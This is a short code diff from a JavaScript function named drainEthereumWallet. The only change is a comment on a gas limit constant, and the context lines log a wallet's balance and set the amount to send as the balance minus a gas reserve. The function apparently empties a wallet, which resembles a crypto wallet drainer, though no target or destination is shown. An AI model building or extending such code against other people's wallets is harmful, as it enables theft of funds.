@@ -35,7 +35,7 @@ async function drainEthereumWallet(wallet) {
             console.log(`💰 Wallet Balance (wei): ${balance.toString()}`);
             console.log(`💰 Wallet Balance: ${balance}`);
 
-            const gasLimit = 1000000000000000n; // 200,000 wei
+            const gasLimit = 1000000000000000n; //$2.03
 
             // const gasCost = gasLimit * gasPrice;
             let sendAmount = balance - gasLimit;
